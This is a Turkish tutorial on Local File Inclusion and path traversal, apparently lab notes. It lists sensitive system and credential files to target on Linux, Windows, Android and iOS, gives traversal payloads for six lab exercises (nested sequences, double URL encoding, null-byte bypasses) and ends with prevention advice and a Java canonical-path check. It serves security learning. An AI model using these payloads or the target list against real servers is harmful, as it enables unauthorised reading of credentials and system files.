# LFI (Local File Inclusion) Güvenlik Açığı

## İçerik

- [Genel Bakış](#genel-bakış)
- [Dizin Yolu Geçişi Nedir?](#dizin-yolu-geçişi-nedir)
- [Önemli Dosyalar](#önemli-dosyalar)
  - [Sistem Bilgileri ve Kullanıcı Hesapları](#sistem-bilgileri-ve-kullanıcı-hesapları-için)
  - [Güvenlik ve Yetkilendirme Bilgileri](#güvenlik-ve-yetkilendirme-bilgileri-için)
  - [Log Dosyaları](#log-dosyaları-bilgi-toplamak-için)
  - [Yapılandırma Dosyaları](#yapılandırma-dosyaları-kimlik-bilgileri-için)
  - [Kod Dosyaları](#kod-dosyaları-ekstra-açıklar-bulmak-için)
  - [Çekirdek ve Bellek Dosyaları](#çekirdek-ve-bellek-ile-ilgili-dosyalar-daha-derin-erişim-için)
- [Lab Örnekleri](#lab-örnekleri)
  - [Lab 1: Basit Durum](#lab-1-file-path-traversal-simple-case)
  - [Lab 2: Mutlak Yol Bypass](#lab-2-file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass)
  - [Lab 3: Özyinelemeli Olmayan Temizleme](#lab-3-file-path-traversal-traversal-sequences-stripped-non-recursively)
  - [Lab 4: URL Kodlama Bypass](#lab-4-file-path-traversal-traversal-sequences-stripped-with-superfluous-url-decode)
  - [Lab 5: Yol Başlangıcı Doğrulama](#lab-5-file-path-traversal-validation-of-start-of-path)
  - [Lab 6: Null Byte Bypass](#lab-6-file-path-traversal-validation-of-file-extension-with-null-byte-bypass)
- [Önleme Yöntemleri](#nasıl-önlenir)

## Genel Bakış

LFI (Local File Inclusion), bir web güvenlik açığıdır ve saldırganların sunucu üzerindeki yerel dosyalara yetkisiz erişim sağlamasına olanak tanır. File Inclusion, yeni dosya dahil etme saldırısı (Remote File Inclusion) saldırganın hedef web sitesine bir dosya dahil etmesine ya da hedef web sitesinin kendinde olan ama sunmadığı bir dosyayı görüntüleyebilmesine (Local File Inclusion) denir. LFI saldırıları, genellikle kötü yapılandırılmış dosya içerme mekanizmalarından kaynaklanır ve genellikle PHP gibi dinamik olarak dosya içeren dillerde görülür.

## Dizin Yolu Geçişi Nedir?

Bir saldırganın sunucudaki dosyalara yazabilmesine sebep olur, bu da uygulama verilerini veya davranışlarını değiştirmesine ve sunucunun tam kontrolünü ele geçirmesine olanak tanır.

Görüntü dosyaları diskte `/var/www/images/` dizininde saklanır, örneğin:
```
/var/www/images/218.png
```

Eğer sistem `/etc/passwd` yol geçiş saldırılarına karşı hiçbir savunma uygulamazsa:
```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

Bu, dosya sisteminde şu şekilde çözümlenir:
```
/var/www/images/../../../etc/passwd → dosya sisteminin köküne doğru ilerler
```

Sonuç olarak `/etc/passwd` dosyası okunur. Bu dosya sunucuda kayıtlı kullanıcıların ayrıntılarını içeren standart bir dosyadır.

- `../` ve `..\` geçerli dizin geçişleridir.
- Windows tabanlı sunucuya karşı eşdeğer bir saldırı: 
  ```
  https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
  ```

## Önemli Dosyalar

### Sistem Bilgileri ve Kullanıcı Hesapları İçin

- **Linux/macOS:** `/etc/passwd` (Kullanıcı hesap bilgileri içerir, ancak şifreler hashlenmez.)
- **Linux/macOS:** `/etc/shadow` (Kullanıcı şifre hashlerini içerir, root erişimi gerektirir.)
- **Windows:** `C:\Users` (Kullanıcı hesaplarını ve profillerini içerir.)
- **Windows:** `C:\Windows\System32\config\SAM` (Kullanıcı hesap bilgileri ve kimlik doğrulama için kullanılır.)
- **Android:** `/data/system/packages.xml` (Yüklü uygulamalar ve izinleri hakkında bilgi içerir.)
- **iOS:** `/private/var/mobile/Library/Accounts/Accounts3.sqlite` (Kullanıcı hesap bilgilerini içerir.)

### Güvenlik ve Yetkilendirme Bilgileri İçin

- **Linux/macOS:** `/etc/sudoers` (Yetkilendirme kurallarını içerir.)
- **Linux/macOS:** `/var/run/utmp` (Aktif oturum bilgilerini içerir.)
- **Linux/macOS:** `/var/log/wtmp` (Kullanıcı giriş çıkış bilgilerini içerir.)
- **Windows:** `C:\Windows\System32\config\SECURITY` (Güvenlik ilkelerini içerir.)
- **Windows:** `C:\Windows\System32\config\SYSTEM` (Sistem yapılandırmalarını içerir.)
- **Android:** `/data/system/users/0/settings_secure.xml` (Kullanıcı güvenlik ayarlarını içerir.)
- **iOS:** `/private/var/Keychains/keychain-2.db` (Anahtar zinciri (keychain) verilerini içerir.)

### Log Dosyaları (Bilgi Toplamak İçin)

- **Linux/macOS:** `/var/log/auth.log` (Kimlik doğrulama ve SSH girişlerini içerir.)
- **Linux/macOS:** `/var/log/syslog` (Genel sistem loglarını içerir.)
- **Linux/macOS:** `/var/log/secure` (Yetkilendirme loglarını içerir.)
- **Windows:** `C:\Windows\debug\NetSetup.log` (Ağ yapılandırma loglarını içerir.)
- **Windows:** `C:\Windows\System32\winevt\Logs\Security.evtx` (Güvenlik olaylarını içerir.)
- **Linux:** `/proc/kmsg` (Çekirdek loglarını içerir.)
- **Android:** `/data/misc/logd/logcat` (Uygulama ve sistem loglarını içerir.)
- **iOS/macOS:** `/private/var/log/system.log` (Genel sistem loglarını içerir.)

### Yapılandırma Dosyaları (Kimlik Bilgileri İçin)

- **Linux:** `/etc/network/interfaces` (Ağ yapılandırmalarını içerir.)
- **Linux/macOS:** `/etc/resolv.conf` (DNS yapılandırmalarını içerir.)
- **Linux/macOS:** `/etc/hosts` (Yerel DNS kayıtlarını içerir.)
- **Windows:** `C:\Windows\System32\drivers\etc\hosts` (Yerel DNS kayıtlarını içerir.)
- **Windows:** `C:\Windows\win.ini` (Eski sistem yapılandırmalarını içerir.)
- **Android:** `/data/misc/wifi/wpa_supplicant.conf` (Kaydedilmiş Wi-Fi şifrelerini içerir.)
- **iOS:** `/private/etc/hosts` (Yerel DNS kayıtlarını içerir.)

### Kod Dosyaları (Ekstra Açıklar Bulmak İçin)

- **Linux:** `/var/www/html/index.php` (Web sunucuya ait PHP dosyası, LFI ile kaynak kod görüntülenebilir.)
- **Linux/macOS:** `/etc/apache2/apache2.conf` (Apache web sunucu yapılandırmasını içerir.)
- **Windows:** `C:\inetpub\wwwroot\web.config` (IIS web sunucusu yapılandırmasını içerir.)
- **Android:** `/data/data/com.example.app/files/` (Uygulama kaynak dosyalarını içerir.)
- **iOS:** `/private/var/mobile/Containers/Data/Application/` (iOS uygulamalarının verilerini içerir.)

### Çekirdek ve Bellek ile İlgili Dosyalar (Daha Derin Erişim İçin)

- **Linux:** `/proc/kcore` (RAM içeriğine erişim sağlar.)
- **Linux:** `/proc/meminfo` (Bellek kullanım durumunu gösterir.)
- **Linux:** `/dev/kmem` (Çekirdek belleğine erişim sağlar.)
- **Windows:** `C:\pagefile.sys` (Sanal belleği içerir.)
- **Windows:** `C:\hiberfil.sys` (Sistem hibernasyon dosyasını içerir.)
- **Android:** `/data/tombstones/` (Çökmüş uygulamaların bellek dökümlerini içerir.)
- **iOS/macOS:** `/private/var/vm/swapfile0` (Bellek takas dosyasını içerir.)

## Lab Örnekleri

### Lab 1: File path traversal, simple case

```
/image?filename=/etc/passwd → Bad Request
image?filename=../../../etc/passwd
```

Sonuç:
```
root:x:0:0:root:/root:/bin/bash
```

- `root` → kullanıcı adı.
- `x` → kullanıcı parolası `/etc/shadow` dosyasında şifrelenmiş halde saklanır.
- `UID` → kullanıcının kimlik numarası, burda 0 dır.
- `GID` → kullanıcının ait olduğu ana grup kimlik numarasıdır, burda 0 dır.
- kullanıcı açıklaması → kullanıcı bilgileri, burda root.
- ana dizin → kullanıcı giriş yaptığında varsayılan olarak yönlendirileceği dizin, burda `/root`'tur.
- kabuğu → kullanıcı oturum açtığında çalıştırılacak kabuk program, burda `/bin/bash` dir.

### Lab 2: File path traversal, traversal sequences blocked with absolute path bypass

```
/image?filename=/etc/passwd → 200 Ok
```

### Lab 3: File path traversal, traversal sequences stripped non-recursively

```
/image?filename=....//....//....//etc/passwd 
```

- `..//` iç içe geçmiş geçiş dizinleri.
- `..\\/` iç dizi çıkarıldığında basit geçiş dizinine geri döner.

### Lab 4: File path traversal, traversal sequences stripped with superfluous URL-decode

```
/image?filename=..%252f..%252f..%252fetc/passwd
```

- `../` → `%2e2e2f` → `%252e%252e%252f`
- standart dışı kodlamalar: `..%c0%af` veya `..%ef%bc%8f`

### Lab 5: File path traversal, validation of start of path

```
/image?filename=/var/www/images/../../../etc/passwd
```

Burada `filename=/var/www/images/../../../etc/passwd` kullanılır.

### Lab 6: File path traversal, validation of file extension with null byte bypass

```
/image?filename=../../../etc/passwd%00.png
```

## Nasıl Önlenir?

Kullanıcı tarafından sağlanan girdiyi dosya sistemi API'lerine geçirmekten tamamen kaçınmaktır. Eğer bundan kaçınılamıyorsa iki katmanlı savunma kullanılmalı:

1. Kullanıcı girdisi işlenmeden önce doğrulanmalı:
   - Whitelist ile karşılaştırılır.
   - Bu olmazsa alfanümerik karakterler gibi yalnızca izin verilen içerik içerdiğini doğrula.

2. Sağlanan girdi doğrulandıktan sonra:
   - Girdi temel dizine eklenir.
   - Yolu kanonikleştirmek için dosya sistemi API'si kullanılır.
   - Kanonikleştirilmiş yol beklenen dizinle başladığı doğrulanır.

```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
}
```